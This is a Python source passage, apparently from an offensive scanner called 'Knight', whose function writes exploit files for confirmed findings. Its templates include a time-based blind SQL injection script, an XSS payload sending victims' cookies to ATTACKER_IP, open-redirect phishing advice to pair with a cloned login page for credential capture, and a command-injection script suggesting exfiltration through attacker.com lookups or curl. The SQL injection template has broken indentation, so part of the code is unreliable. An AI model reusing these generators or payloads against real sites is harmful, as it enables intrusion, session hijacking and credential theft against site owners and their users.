# OFF.8 — Auto Payload Generator (fixed command injection script)
# ──────────────────────────────────────────────────────────────────────────────

def generate_exploit_payloads(findings: list[dict], scan_target: str, evidence_dir: Path) -> list[dict]:
    exploits = []
    payloads_dir = evidence_dir / "exploits"
    payloads_dir.mkdir(exist_ok=True)

    for f in findings:
        if not finding_is_confirmed(f):
            continue
        ftype = f["type"]

        if "SQL Injection" in ftype:
            code = f'''#!/usr/bin/env python3
# Knight GENERATED SQLI EXPLOIT -- {scan_target}
# URL: {f["url"]}

import httpx, time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

URL = "{f["url"]}"
PARAM = "{f.get("parameter", list(parse_qs(urlparse(f["url"]).query).keys())[0] if parse_qs(urlparse(f["url"]).query) else "")}"

def inject(condition):
    parsed = urlparse(URL)
    qs = parse_qs(parsed.query)
    param = PARAM
    payload = "' OR IF((" + condition + "), SLEEP(5), 0)-- -"
    if param not in qs:
        return False
    qs[param] = [payload]
        test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
        t0 = time.monotonic()
        try:
            r = httpx.get(test_url, timeout=10, verify=False)
            if time.monotonic() - t0 > 3:
                return True
        except:
            pass
    return False

if __name__ == "__main__":
    print("[*] Testing SQLi...")
    print(f"[+] Injectable: {{inject('1=1')}}")
    print(f"[+] Version has 5: {{inject('SUBSTRING(@@version,1,1)=5')}}")
'''
            fname = f"sqli_exploit_{int(time.time())}.py"
            with open(payloads_dir / fname, "w") as fh:
                fh.write(code)
            os.chmod(payloads_dir / fname, 0o755)

        elif "Reflected XSS" in ftype:
            code = f'''## XSS Exploit: {scan_target}
### Cookie Stealer Payload
<script>
new Image().src="http://ATTACKER_IP:8081/steal?c="+encodeURIComponent(document.cookie)+"&loc="+encodeURIComponent(document.URL);
</script>

### Attack URL
{f["url"]}
'''
            fname = f"xss_exploit_{int(time.time())}.md"
            with open(payloads_dir / fname, "w") as fh:
                fh.write(code)

        elif "Open Redirect" in ftype:
            code = f'''## Open Redirect Exploit
### Phishing URL (send to victim):
{f["url"]}

Chain with a cloned login page to capture credentials.
'''
            fname = f"openredirect_exploit_{int(time.time())}.md"
            with open(payloads_dir / fname, "w") as fh:
                fh.write(code)

        elif "Command Injection" in ftype:
            code = f'''#!/usr/bin/env python3
# Knight GENERATED CMD INJECTION EXPLOIT – time‑based blind
# Target: {scan_target}
# URL: {f["url"]}
# This script confirms the injection via time delay.

import httpx, time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

URL = "{f["url"]}"
SLEEP_SEC = 5

def inject(cmd, sleep_sec=SLEEP_SEC):
    parsed = urlparse(URL)
    qs = parse_qs(parsed.query)
    for param in qs:
        payload = f"; sleep {{sleep_sec}}"
        qs[param] = [payload]
        test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
        t0 = time.monotonic()
        try:
            r = httpx.get(test_url, timeout=sleep_sec+5, verify=False)
            return time.monotonic() - t0 >= sleep_sec * 0.7
        except:
            return False
    return False

if __name__ == "__main__":
    print("[*] Testing command injection...")
    if inject("sleep 5"):
        print("[+] Command injection CONFIRMED (time delay detected).")
        print("[!] To exfiltrate output, replace 'sleep 5' with your own OOB payload")
        print("[!] e.g. nslookup $(whoami).attacker.com or curl http://attacker/$(whoami)")
    else:
        print("[-] No time delay detected – injection may not work with this payload.")
'''
            fname = f"cmd_injection_exploit_{int(time.time())}.py"
            with open(payloads_dir / fname, "w") as fh:
                fh.write(code)
            os.chmod(payloads_dir / fname, 0o755)

    files = list(payloads_dir.iterdir())
    if files:
        idx = "# Generated Exploit Payloads\n\n" + "".join(f"- [{f.name}]({f.name})\n" for f in files)
        with open(payloads_dir / "INDEX.md", "w") as fh:
            fh.write(idx)
        exploits.append({
            "type": f"Exploit Payloads Generated — {len(files)} files",
            "confidence": "INFORMATIONAL",
            "url": str(payloads_dir),
            "proof": f"{len(files)} exploit payload files in {payloads_dir}/",
            "repro": f"ls -la {payloads_dir}/",
            "img": None,
        })
    return exploits


